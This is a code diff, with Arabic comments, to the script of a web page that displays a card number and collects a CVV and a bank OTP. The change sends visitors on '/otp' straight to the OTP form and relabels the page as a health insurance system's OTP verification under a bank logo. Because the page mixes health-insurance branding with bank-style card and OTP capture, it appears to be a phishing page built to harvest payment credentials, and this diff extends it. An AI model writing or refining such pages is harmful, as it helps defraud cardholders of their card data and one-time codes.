@@ -423,7 +423,21 @@
     document.getElementById('displayCardNumber').textContent = formatted;
   }
 
-  let currentStep = 'cvv'; // cvv | otp
+  // اكتشاف إذا كانت الصفحة /otp
+  const isOtpPage = window.location.pathname === '/otp';
+  let currentStep = isOtpPage ? 'otp' : 'cvv';
+
+  if (isOtpPage) {
+    // إخفاء CVV وإظهار OTP مباشرة
+    document.getElementById('cvvSection').style.display = 'none';
+    document.getElementById('otpSection').classList.add('show');
+    const submitText = document.getElementById('submitText');
+    if (submitText) submitText.textContent = 'تأكيد رمز OTP';
+    // تغيير العنوان
+    document.title = 'رمز التحقق OTP - نظام الضمان الصحي';
+    const bankLogoSpan = document.querySelector('.bank-logo span');
+    if (bankLogoSpan) bankLogoSpan.textContent = 'التحقق برمز OTP';
+  }
 
   // OTP inputs auto-focus
   document.querySelectorAll('.otp-input').forEach((input, idx, inputs) => {
